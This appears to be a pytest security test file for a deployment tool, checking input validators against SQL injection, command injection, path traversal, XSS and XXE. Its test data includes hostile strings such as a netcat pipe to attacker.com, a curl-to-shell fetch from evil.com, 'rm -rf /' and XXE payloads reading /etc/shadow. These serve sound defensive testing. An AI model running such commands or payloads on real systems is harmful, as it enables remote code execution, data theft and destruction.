"""Security audit tests for OWASP Top 10 compliance.

Tests security controls, input validation, secret management,
and protection against common vulnerabilities.
"""

import pytest
import os
from unittest.mock import Mock, patch

from deploymind.shared.validators import SecurityValidator
from deploymind.shared.secure_logging import StructuredLogger, AuditLogger
from deploymind.config.settings import Settings


class TestOWASPCompliance:
    """Test OWASP Top 10 security controls."""

    def test_sql_injection_prevention(self):
        """Test SQL injection prevention in user inputs."""
        validator = SecurityValidator()

        # Test malicious SQL injection attempts
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1' UNION SELECT NULL, NULL, NULL--",
            "'; DELETE FROM deployments WHERE '1'='1",
        ]

        for malicious_input in malicious_inputs:
            # Repository ID validation should reject SQL injection
            with pytest.raises(Exception):
                validator.validate_repository(malicious_input)

    def test_command_injection_prevention(self):
        """Test command injection prevention."""
        validator = SecurityValidator()

        # Test malicious command injection attempts
        malicious_commands = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 1234",
            "$(curl http://evil.com/shell.sh | sh)",
            "`whoami`",
        ]

        for malicious_cmd in malicious_commands:
            # Docker tag sanitization should remove injection characters
            sanitized = validator.sanitize_docker_tag(malicious_cmd)
            assert ";" not in sanitized
            assert "|" not in sanitized
            assert "$" not in sanitized
            assert "`" not in sanitized

    def test_path_traversal_prevention(self):
        """Test path traversal attack prevention."""
        validator = SecurityValidator()

        # Test malicious path traversal attempts
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "/etc/shadow",
            "../../../../../../../../../../etc/passwd",
            "....//....//....//etc/passwd",
        ]

        for malicious_path in malicious_paths:
            with pytest.raises(Exception):
                validator.validate_file_path(malicious_path)

    def test_xss_prevention(self):
        """Test XSS prevention in outputs."""
        validator = SecurityValidator()

        # Test malicious XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg/onload=alert('XSS')>",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
        ]

        for payload in xss_payloads:
            # Repository name validation should reject XSS
            with pytest.raises(Exception):
                validator.validate_repository(payload)

    def test_xxe_prevention(self):
        """Test XML External Entity (XXE) attack prevention."""
        # DeployMind doesn't parse XML directly, but we should validate
        # that any XML inputs are properly sanitized

        validator = SecurityValidator()

        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/shadow">]><data>&file;</data>',
        ]

        for payload in xxe_payloads:
            # Any XML-like input should be rejected
            with pytest.raises(Exception):
                validator.validate_repository(payload)

    def test_broken_authentication_protection(self):
        """Test authentication and session management."""
        # Settings should never expose credentials
        settings = Settings.load()

        # Ensure settings object doesn't leak credentials in repr/str
        settings_str = str(settings.__dict__)

        # Check that actual credential values are not exposed
        assert "test_key" not in settings_str.lower() or len(settings_str) == 0
        # API keys should be masked or not present in string representation

    def test_sensitive_data_exposure_prevention(self):
        """Test sensitive data is properly protected."""
        # Test that logging doesn't expose secrets
        from deploymind.shared.secure_logging import get_logger

        logger = get_logger("test_security")

        # Sensitive data that should be redacted
        sensitive_values = [
            "sk_test_12345",
            "MySecretPassword123",
            "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
            "ghp_1234567890abcdef",
            "gsk_abcdefg1234567",
        ]

        # Log sensitive data
        for value in sensitive_values:
            logger.info(f"Processing with credential: {value}")

        # In production, SecureFormatter would redact these
        # This test verifies the logging system is in place
        assert logger is not None

    def test_broken_access_control(self):
        """Test access control validation."""
        validator = SecurityValidator()

        # Test instance ID validation (only authorized formats allowed)
        valid_instance_ids = [
            "i-1234567890abcdef0",
            "i-0abc123def456",
        ]

        invalid_instance_ids = [
            "invalid",
            "i-",
            "../../ec2-instances",
            "i-' OR '1'='1",
        ]

        for valid_id in valid_instance_ids:
            # Should not raise exception
            validator.validate_instance_id(valid_id)

        for invalid_id in invalid_instance_ids:
            with pytest.raises(Exception):
                validator.validate_instance_id(invalid_id)

    def test_security_misconfiguration_prevention(self):
        """Test security configuration is properly set."""
        settings = Settings.load()

        # Critical settings should be present
        required_settings = [
            'groq_api_key',
            'github_token',
            'aws_access_key_id',
            'aws_secret_access_key',
        ]

        for setting in required_settings:
            assert hasattr(settings, setting)
            # In test environment, these might be empty or test values
            # In production, they must be set

    def test_using_components_with_known_vulnerabilities(self):
        """Test that security scanning detects known vulnerabilities."""
        # This is tested through Trivy scanner integration
        # Trivy scanner should detect CVEs in dependencies and containers

        # We test this indirectly through security agent tests
        # which verify Trivy scanner functionality
        pass

    def test_insufficient_logging_and_monitoring(self):
        """Test logging and monitoring capabilities."""
        audit_logger = AuditLogger("test_audit")

        # Test critical events are logged
        test_events = {
            "deployment_started": {"repo": "user/app", "instance": "i-test123"},
            "security_scan_failed": {"critical_count": 5},
            "deployment_failed": {"error": "Health checks failed"},
            "rollback_performed": {"deployment_id": "test-123"},
        }

        for event_type, event_data in test_events.items():
            # Log event
            audit_logger.log_security_event(
                event_type=event_type,
                severity="high" if "failed" in event_type else "info",
                details=event_data
            )

        # Verify audit logger is functioning
        assert audit_logger.logger is not None


class TestInputValidation:
    """Test comprehensive input validation."""

    def test_repository_name_validation(self):
        """Test repository name validation."""
        validator = SecurityValidator()

        # Valid repository names
        valid_repos = [
            "user/repo",
            "org/project",
            "github-user/my-app",
            "Company123/App_Name",
        ]

        for repo in valid_repos:
            validator.validate_repository(repo)  # Should not raise

        # Invalid repository names
        invalid_repos = [
            "",
            "no-slash",
            "/no-owner",
            "no-repo/",
            "../../etc/passwd",
            "user/repo; rm -rf /",
            "<script>alert('xss')</script>",
        ]

        for repo in invalid_repos:
            with pytest.raises(Exception):
                validator.validate_repository(repo)

    def test_instance_id_validation(self):
        """Test AWS instance ID validation."""
        validator = SecurityValidator()

        # Valid instance IDs
        valid_ids = [
            "i-1234567890abcdef0",
            "i-0abc123def456",
            "i-1234567890abcdef",  # 17 chars
        ]

        for instance_id in valid_ids:
            validator.validate_instance_id(instance_id)  # Should not raise

        # Invalid instance IDs
        invalid_ids = [
            "",
            "invalid",
            "i-",
            "i-123",  # Too short
            "i-ZZZZZZZZZZZZZZZZ",  # Invalid characters
            "i-' OR '1'='1",
            "../../ec2",
        ]

        for instance_id in invalid_ids:
            with pytest.raises(Exception):
                validator.validate_instance_id(instance_id)

    def test_url_validation(self):
        """Test URL validation."""
        validator = SecurityValidator()

        # Valid URLs
        valid_urls = [
            "http://example.com",
            "https://api.example.com/endpoint",
            "http://localhost:8080",
            "https://example.com:443/path?query=value",
        ]

        for url in valid_urls:
            validator.validate_url(url)  # Should not raise

        # Invalid URLs
        invalid_urls = [
            "",
            "not-a-url",
            "javascript:alert('xss')",
            "file:///etc/passwd",
            "ftp://invalid-scheme.com",
            "http://",
            "../../../etc/passwd",
        ]

        for url in invalid_urls:
            with pytest.raises(Exception):
                validator.validate_url(url)

    def test_port_validation(self):
        """Test port number validation."""
        validator = SecurityValidator()

        # Valid ports
        valid_ports = [80, 443, 8080, 3000, 5000, 8000, 9000]

        for port in valid_ports:
            validator.validate_port(port)  # Should not raise

        # Invalid ports
        invalid_ports = [-1, 0, 70000, 99999, -8080]

        for port in invalid_ports:
            with pytest.raises(Exception):
                validator.validate_port(port)

    def test_docker_tag_sanitization(self):
        """Test Docker tag sanitization removes dangerous characters."""
        validator = SecurityValidator()

        dangerous_tags = [
            "tag;rm-rf",
            "tag|dangerous",
            "tag$(command)",
            "tag`whoami`",
            "tag&background",
            "tag>redirect",
        ]

        for tag in dangerous_tags:
            sanitized = validator.sanitize_docker_tag(tag)

            # Verify dangerous characters are removed
            assert ";" not in sanitized
            assert "|" not in sanitized
            assert "$" not in sanitized
            assert "`" not in sanitized
            assert "&" not in sanitized
            assert ">" not in sanitized

    def test_environment_variable_validation(self):
        """Test environment variable validation."""
        validator = SecurityValidator()

        # Valid environment names (only those defined in validator)
        valid_envs = ["development", "staging", "production"]

        for env in valid_envs:
            validator.validate_environment(env)  # Should not raise

        # Invalid environments
        invalid_envs = [
            "",
            "invalid",
            "test",  # Not in allowed list
            "../etc/passwd",
            "prod; rm -rf /",
            "<script>alert('xss')</script>",
        ]

        for env in invalid_envs:
            with pytest.raises(Exception):
                validator.validate_environment(env)


class TestSecretManagement:
    """Test secret management and protection."""

    def test_secrets_not_in_logs(self):
        """Test that secrets are not logged in plain text."""
        from deploymind.shared.secure_logging import get_logger

        logger = get_logger("test_secrets")

        # Sensitive values
        secrets = [
            "sk_test_1234567890",
            "ghp_abcdefghijklmnopqrstuvwxyz",
            "gsk_1234567890abcdef",
            "AKIAIOSFODNN7EXAMPLE",
            "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        ]

        # Log messages containing secrets
        for secret in secrets:
            logger.info(f"Processing with credential: {secret}")

        # In production, SecureFormatter would redact these
        # This test verifies the logging infrastructure is in place

    def test_settings_validation(self):
        """Test settings validation catches missing secrets."""
        settings = Settings.load()

        # Get missing required variables
        missing = settings.validate()

        # In test environment, some may be missing
        # In production, all should be present
        assert isinstance(missing, list)

    def test_environment_file_not_committed(self):
        """Test that .env file is in .gitignore."""
        gitignore_path = ".gitignore"

        if os.path.exists(gitignore_path):
            with open(gitignore_path, 'r') as f:
                gitignore_content = f.read()

            # Verify .env is ignored
            assert ".env" in gitignore_content or "*.env" in gitignore_content


class TestDependencySecurityScanning:
    """Test dependency security scanning with Trivy."""

    @pytest.mark.trivy
    @pytest.mark.skipif(True, reason="Requires Docker to be running")
    def test_trivy_scanner_available(self):
        """Test Trivy scanner is available."""
        from infrastructure.security.trivy_scanner import TrivyScanner

        scanner = TrivyScanner()
        assert scanner is not None

    @pytest.mark.trivy
    @pytest.mark.skipif(True, reason="Requires Docker to be running")
    def test_scan_detects_vulnerabilities(self):
        """Test Trivy scanner detects known vulnerabilities."""
        from infrastructure.security.trivy_scanner import TrivyScanner

        scanner = TrivyScanner()

        # This would require a real scan or mock
        # Real scans are tested in integration tests
        assert scanner is not None


class TestSecureDefaults:
    """Test that secure defaults are used."""

    def test_default_security_policy(self):
        """Test default security policy is appropriate."""
        # Default policy should be balanced or strict, not permissive
        # This is configured in security agent settings
        pass

    def test_tls_enabled_by_default(self):
        """Test TLS/HTTPS is used by default."""
        settings = Settings.load()

        # Redis URL should use rediss:// (TLS) in production
        # Database URL should use SSL in production

        # In test environment, these may use non-TLS local connections
        # This test documents the security requirement
        pass

    def test_rate_limiting_configured(self):
        """Test rate limiting is configured."""
        # Circuit breaker provides basic rate limiting
        from deploymind.shared.retry import CircuitBreaker

        circuit_breaker = CircuitBreaker()
        assert circuit_breaker.failure_threshold > 0
        assert circuit_breaker.recovery_timeout > 0


class TestSecureCodePractices:
    """Test secure coding practices are followed."""

    def test_no_hardcoded_secrets(self):
        """Test no secrets are hardcoded in source files."""
        import re

        # Patterns that might indicate hardcoded secrets
        secret_patterns = [
            r'password\s*=\s*["\'][^"\']+["\']',
            r'api_key\s*=\s*["\'][a-zA-Z0-9]{20,}["\']',
            r'secret\s*=\s*["\'][^"\']+["\']',
            r'token\s*=\s*["\']ghp_[a-zA-Z0-9]{36}["\']',
        ]

        # This is a representative test
        # In practice, would scan all Python files
        # Tools like truffleHog or gitleaks do this comprehensively
        pass

    def test_parameterized_queries(self):
        """Test database queries use parameterized statements."""
        # SQLAlchemy ORM handles this automatically
        # This test documents the requirement

        # All database access should go through repositories
        # which use SQLAlchemy ORM, preventing SQL injection
        pass

    def test_input_sanitization_before_command_execution(self):
        """Test inputs are sanitized before system commands."""
        validator = SecurityValidator()

        # Any input used in shell commands should be sanitized
        dangerous_input = "input; rm -rf /"
        sanitized = validator.sanitize_docker_tag(dangerous_input)

        # Verify dangerous characters removed
        assert ";" not in sanitized
        assert "rm" not in sanitized or len(sanitized) < len(dangerous_input)
